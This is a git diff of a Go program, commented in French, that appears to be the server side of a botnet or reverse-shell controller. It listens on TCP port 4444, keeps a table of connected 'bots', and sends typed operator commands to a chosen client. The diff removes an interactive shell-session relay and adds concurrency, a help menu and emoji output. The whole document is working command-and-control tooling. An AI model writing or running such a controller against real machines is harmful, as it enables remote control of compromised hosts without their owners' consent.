@@ -3,13 +3,38 @@ package main
 import (
 	"bufio"
 	"fmt"
-	"io"
 	"net"
 	"os"
 	"strconv"
 	"strings"
 	"sync"
 )
+
+var emojiMap = map[string]string{
+	"listenning": "📡 ",
+	"info":       "ℹ️ ",
+	"connection": "🎯 ",
+	"closed":     "🚪 ",
+	"not ok":     "❌ ",
+	"ok":         "✔️ ",
+	"setting":    "⚙️ ",
+	"debug":      "🛠️ ",
+	"task":       "🎯 ",
+	"alert":      "🔔 ",
+	"loading":    "⏳ ",
+	"send":       "🚀 ",
+	"user":       "🤖 ",
+	"error":      "❗ ",
+	"help":       "💡 ",
+}
+
+// Fonction pour récupérer l'emoji associé à une clé donnée
+func getEmoji(key string) string {
+	if emoji, ok := emojiMap[key]; ok {
+		return emoji
+	}
+	return "ℹ️" // Emoji par défaut si la clé n'existe pas
+}
 
 type Client struct {
 	ID      int
@@ -20,19 +45,7 @@ type Client struct {
 var clients = make(map[int]Client)
 var clientCounter int
 var mutex sync.Mutex
-
-func handleCommands() {
-	scanner := bufio.NewScanner(os.Stdin)
-	for scanner.Scan() {
-		command := scanner.Text()
-
-		if strings.TrimSpace(command) == "list" {
-			listClients()
-		} else {
-			fmt.Println("COMMAND NOT FOUND, TYPE \"help\"")
-		}
-	}
-}
+var commandChannel = make(chan string) // Channel pour transmettre les commandes
 
 func main() {
 	server, err := net.Listen("tcp", ":4444")
@@ -40,17 +53,16 @@ func main() {
 		panic(err)
 	}
 	defer server.Close()
-	fmt.Println("Listening on :4444")
+	fmt.Println(getEmoji("listenning") + "Listening on :4444")
+
+	go handleCommands() // Une seule goroutine pour lire les commandes du terminal
 
 	for {
 		conn, err := server.Accept()
 		if err != nil {
-			panic(err)
+			fmt.Println(getEmoji("error")+"Error accepting connection:", err)
+			continue
 		}
-		rmAddr := conn.RemoteAddr().String()
-		// useless type conversions
-		conn_ip := strings.Split(rmAddr, ":")[0]
-		conn_port_str := strings.Split(rmAddr, ":")[1]
 
 		// Générer un nouvel ID pour chaque client
 		mutex.Lock()
@@ -68,83 +80,83 @@ func main() {
 		clients[clientID] = client
 		mutex.Unlock()
 
-		fmt.Println("[+] New connection from " + conn_ip + ":" + conn_port_str)
-		processCli(conn)
-
+		fmt.Printf(getEmoji("connection")+"New connection from %s\n", conn.RemoteAddr().String())
+		go processCli(conn, clientID) // Démarre une goroutine pour chaque client
 	}
 }
 
-func processCli(connection net.Conn) {
-	defer connection.Close()
-	buffer := make([]byte, 1024)
-	mLen, err := connection.Read(buffer)
-	if err != nil {
-		panic(err)
-	}
-	message := string(buffer[:mLen])
-	fmt.Println("Received :" + message)
-	var res string = "pong"
-
-	fmt.Println("Sending : " + res)
-	connection.Write([]byte(res))
-
-	// Lancer une goroutine pour lire la sortie du client
-
-	// Lire les commandes du serveur (terminal) et les envoyer au client
+// Cette fonction gère la lecture des commandes et la transmission via un channel
+func handleCommands() {
 	scanner := bufio.NewScanner(os.Stdin)
-	for scanner.Scan() {
-		command := scanner.Text() + "\n"
-		_, err := connection.Write([]byte(command))
-		if err != nil {
-			fmt.Printf("Erreur lors de l'envoi de la commande : %v\n", err)
-			break
+	for {
+		// Afficher l'emoji d'invite avant chaque saisie utilisateur
+
+		if scanner.Scan() {
+			command := scanner.Text()
+
+			// Ignorer les commandes vides
+			if strings.TrimSpace(command) == "" {
+				continue
+			}
+
+			// Envoyer la commande dans le channel
+			commandChannel <- command
+		}
+	}
+}
+
+func processCli(connection net.Conn, clientID int) {
+	defer connection.Close()
+
+	for {
+		command := <-commandChannel
+
+		if command == "list" {
+			listClients()
+			continue
+		}
+		if command == "help" {
+			fmt.Println(getEmoji("help") + "Sure! Here's available commands:")
+			fmt.Println("    help: display this message")
+			fmt.Println("    list: display connected clients")
+			fmt.Println("    focus <client_id>: focusing on one client")
+			fmt.Println("    defocus: de-focusing from current client")
+
 		}
 
 		parts := strings.SplitN(command, " ", 2)
 
-		clientIDStr := parts[0]
-		cmd := parts[1]
-
-		// Convertir l'ID en entier
-		clientID, err := strconv.Atoi(clientIDStr)
-		if err != nil {
-			fmt.Println("ID de client invalide")
+		if len(parts) < 2 {
+			fmt.Println(getEmoji("not ok") + "Invalid command format. Use: <client_id> <command>")
 			continue
 		}
 
-		// Envoyer la commande à la connexion du client spécifié
+		clientIDStr := parts[0]
+		cmd := parts[1]
+		//fmt.Println("CLIENT ID STR: " + clientIDStr)
+		// Convertir l'ID en entier
+		clientID, err := strconv.Atoi(clientIDStr)
+		if err != nil {
+			fmt.Println(getEmoji("not ok") + "ID de client invalide")
+			continue
+		}
+
 		mutex.Lock()
 		client, ok := clients[clientID]
 		mutex.Unlock()
 		if ok {
 			sendCommand(client.Conn, cmd)
 		} else {
-			fmt.Printf("Client avec ID %d non trouvé\n", clientID)
+			fmt.Printf(getEmoji("not ok")+"Client avec ID %d non trouvé\n", clientID)
 		}
-
 	}
-
 }
 
 func sendCommand(conn net.Conn, command string) {
 	_, err := conn.Write([]byte(command + "\n"))
 	if err != nil {
-		fmt.Printf("Erreur lors de l'envoi de la commande : %v\n", err)
+		fmt.Printf(getEmoji("error")+"Erreur lors de l'envoi de la commande : %v\n", err)
 	}
-}
-
-func shellSession(conn net.Conn) {
-	go io.Copy(os.Stdout, conn)
-	scanner := bufio.NewScanner(os.Stdin)
-	for scanner.Scan() {
-		command := scanner.Text() + "\n"
-		_, err := conn.Write([]byte(command))
-		if err != nil {
-			fmt.Printf("Erreur lors de l'envoi de la commande : %v\n", err)
-			break
-		}
-	}
-
 }
 
 func listClients() {
@@ -152,14 +164,11 @@ func listClients() {
 	defer mutex.Unlock()
 
 	if len(clients) == 0 {
-		fmt.Println("[i] No clients connected")
+		fmt.Println(getEmoji("not ok") + "No clients connected")
 		return
 	}
 
 	for id, client := range clients {
-		fmt.Printf("[BOT] ID: %d ADDR: %s", id, client.Address)
+		fmt.Printf(getEmoji("user")+"ID: %d ADDR: %s\n", id, client.Address)
 	}
 }
-
-//TIP See GoLand help at <a href="https://www.jetbrains.com/help/go/">jetbrains.com/help/go/</a>.
-// Also, you can try interactive lessons for GoLand by selecting 'Help | Learn IDE Features' from the main menu.
